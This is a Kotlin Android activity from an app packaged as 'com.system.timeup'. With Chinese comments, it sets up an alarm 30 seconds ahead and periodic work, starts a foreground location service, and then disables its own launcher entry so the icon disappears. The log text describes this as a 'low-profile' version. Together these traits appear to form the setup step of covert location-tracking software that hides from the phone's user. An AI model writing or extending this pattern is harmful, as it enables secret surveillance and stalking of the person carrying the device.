package com.system.timeup

import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class SetupActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        FileLog.i(this, "初始化入口启动：安排3分钟闹钟 + 立刻启动一次前台定位任务 + 周期保险（低调通知版）")

        // 安排更快触发一次（30s）
        AlarmKick.ensure(this, seconds = 30, reason = "初始化入口快速触发")
        // 周期保险
        WorkKick.ensurePeriodic(this)

        // 立刻启动一次（FGS 拿定位更稳）
        LocationFgService.start(this, reason = "初始化入口")

        // 禁用桌面入口
        disableLauncherAlias()

        finish()
    }

    private fun disableLauncherAlias() {
        val pm = packageManager
        val alias = ComponentName(this, "com.system.timeup.LauncherAlias")
        pm.setComponentEnabledSetting(
            alias,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        FileLog.i(this, "桌面入口已禁用：图标应在桌面刷新后消失")
    }
}